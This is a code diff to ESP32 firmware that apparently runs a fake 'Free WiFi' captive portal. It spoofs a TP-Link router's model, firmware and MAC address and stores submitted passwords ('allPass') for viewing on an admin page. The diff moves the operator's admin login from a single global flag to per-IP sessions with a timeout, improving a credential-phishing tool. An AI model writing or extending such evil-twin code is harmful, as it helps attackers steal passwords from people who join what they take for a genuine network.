@@ -5,6 +5,7 @@
 #include <DNSServer.h>
 #include <WebServer.h>
 #include <EEPROM.h>
+#include <map>
 
 const char* SSID_NAME = "Free WiFi";
 #define LED_BUILTIN 2
@@ -31,7 +32,6 @@ String deviceModel = "Archer C7 v5.0";
 String firmwareVersion = "1.0.3 Build 20200101";
 String macAddress = "74:DA:38:4E:23:AC";
 String adminPassword = "admin123";
-bool isAuthenticated = false;
 
 int initialCheckLocation = 20;
 int passStart = 30;
@@ -46,6 +46,24 @@ int macStart = 270;
 unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
 DNSServer dnsServer;
 WebServer webServer(80);
+
+std::map<String, bool> authenticatedClients;
+std::map<String, unsigned long> clientLoginTime;
+const unsigned long SESSION_TIMEOUT = 3600000;
+
+String getClientID() {
+  return webServer.client().remoteIP().toString();
+}
+
+bool isClientAuthenticated() {
+  String clientID = getClientID();
+  if (!authenticatedClients[clientID]) return false;
+  if (millis() - clientLoginTime[clientID] > SESSION_TIMEOUT) {
+    authenticatedClients[clientID] = false;
+    return false;
+  }
+  return true;
+}
 
 String input(String argName) {
   String a = webServer.arg(argName);
@@ -75,7 +93,7 @@ String header(String t) {
     ".input-group input { width:100%; padding:15px 20px; border:2px solid #e0e0e0; border-radius:12px; font-size:16px; transition:all 0.3s; background:#f8f9fa; margin-bottom:15px; }"
     ".input-group input:focus { outline:none; border-color:#2a5298; background:white; box-shadow:0 0 0 4px rgba(42,82,152,0.1); }"
     ".btn { background:linear-gradient(135deg, #1e3c72 0%, #2a5298 100%); color:white; border:none; padding:15px 30px; border-radius:12px; font-size:16px; font-weight:600; cursor:pointer; width:100%; transition:all 0.3s; text-transform:uppercase; letter-spacing:1px; margin-top:10px; }"
-    ".btn-admin { display: inline-block; padding: 12px 30px; background-color: #28a745; color: #fff; border-radius: 4px; text-decoration: none; transition: background-color 0.3s ease; }"
+    ".btn-admin { display: inline-block; padding: 12px 30px; background-color: #28a745; color: #fff; border-radius: 4px; text-decoration: none; }"
     ".btn:hover { transform:translateY(-2px); box-shadow:0 10px 30px rgba(30,60,114,0.3); }"
     ".status-bar { background:#e8f4fd; padding:15px; border-radius:12px; margin-bottom:25px; display:flex; align-items:center; gap:15px; }"
     ".status-bar .led { width:12px; height:12px; background:#4caf50; border-radius:50%; animation:pulse 2s infinite; }"
@@ -138,7 +156,9 @@ String loginPage() {
 String handleLogin() {
   String pass = input("p");
   if (pass == adminPassword) {
-    isAuthenticated = true;
+    String clientID = getClientID();
+    authenticatedClients[clientID] = true;
+    clientLoginTime[clientID] = millis();
     return header("Login Successful") +
       "<div class='text-center' style='padding:30px;'>"
       "<i class='fas fa-check-circle' style='font-size:64px; color:#28a745; margin-bottom:20px;'></i>"
@@ -146,7 +166,6 @@ String handleLogin() {
       "<a href='/pass' class='btn btn-admin'>Continue to Admin Panel</a>"
       "</div>" + footer();
   } else {
-    isAuthenticated = false;
     return header("Login Failed") +
       "<div class='text-center' style='padding:30px;'>"
       "<i class='fas fa-times-circle' style='font-size:64px; color:#dc3545; margin-bottom:20px;'></i>"
@@ -193,7 +212,7 @@ String posted() {
 }
 
 String pass() {
-  if (!isAuthenticated) {
+  if (!isClientAuthenticated()) {
     return loginPage();
   }
   return header(PASS_TITLE) + 
@@ -211,7 +230,7 @@ String pass() {
 }
 
 String ssid() {
-  if (!isAuthenticated) {
+  if (!isClientAuthenticated()) {
     return loginPage();
   }
   return header("Network Settings") + 
@@ -233,7 +252,7 @@ String ssid() {
 }
 
 String footerPage() {
-  if (!isAuthenticated) {
+  if (!isClientAuthenticated()) {
     return loginPage();
   }
   return header("Footer Settings") + 
@@ -255,7 +274,7 @@ String footerPage() {
 }
 
 String brandPage() {
-  if (!isAuthenticated) {
+  if (!isClientAuthenticated()) {
     return loginPage();
   }
   String cleanModel = routerModel;
@@ -297,7 +316,7 @@ String brandPage() {
 }
 
 String postedBrand() {
-  if (!isAuthenticated) {
+  if (!isClientAuthenticated()) {
     return loginPage();
   }
   if (webServer.hasArg("rm")) {
@@ -349,7 +368,7 @@ String postedBrand() {
 }
 
 String postedFooter() {
-  if (!isAuthenticated) {
+  if (!isClientAuthenticated()) {
     return loginPage();
   }
   String newFooter = input("f");
@@ -374,7 +393,7 @@ String postedFooter() {
 }
 
 String postedSSID() {
-  if (!isAuthenticated) {
+  if (!isClientAuthenticated()) {
     return loginPage();
   }
   String postedSSID = input("s");
@@ -400,7 +419,7 @@ String postedSSID() {
 }
 
 String handleSSIDChange() {
-  if (!isAuthenticated) {
+  if (!isClientAuthenticated()) {
     return loginPage();
   }
   if (webServer.hasArg("name")) {
@@ -424,7 +443,7 @@ String handleSSIDChange() {
 }
 
 String clear() {
-  if (!isAuthenticated) {
+  if (!isClientAuthenticated()) {
     return loginPage();
   }
   allPass = "";
@@ -600,7 +619,8 @@ void setup() {
   });
   
   webServer.on("/logout", []() {
-    isAuthenticated = false;
+    String clientID = getClientID();
+    authenticatedClients[clientID] = false;
     webServer.send(HTTP_CODE, "text/html", header("Logged Out") + 
       "<div class='text-center' style='padding:30px;'>"
       "<i class='fas fa-sign-out-alt' style='font-size:64px; color:#1e3c72; margin-bottom:20px;'></i>"
